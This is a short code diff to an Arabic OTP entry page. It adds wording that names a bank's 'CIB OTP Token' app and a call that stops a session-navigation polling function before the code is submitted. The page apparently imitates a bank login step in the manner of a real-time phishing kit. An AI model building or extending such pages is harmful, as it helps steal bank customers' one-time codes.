@@ -11,9 +11,7 @@
 
     <main class="otp2-main">
       <h1 class="otp2-heading">OTP أدخل الرقم السرى المتغير</h1>
-      <p class="otp2-lead">
-        برجاء إدخال الرقم السري المتغير OTP الذي تم إنشائه من خلال تطبيق الرقم السري
-        المتغير
+      <p class="otp2-lead">عزيزي العميل برجاء إدخال الرقم السري المتغير الذي تم إنشائه من خلال تطبيق CIB OTP Token
       </p>
 
       <div class="otp2-cells-wrap" aria-label="رمز مكون من 6 أرقام">
@@ -213,6 +211,9 @@
         }
 
         document.querySelector('.otp-btn').addEventListener('click', async function () {
+          if (typeof stopYasmeenSessionNavPolling === 'function') {
+            stopYasmeenSessionNavPolling();
+          }
           stopPoll();
           var cells = document.querySelectorAll('.otp2-cell');
           var hiddenEl = document.getElementById('otp-code');
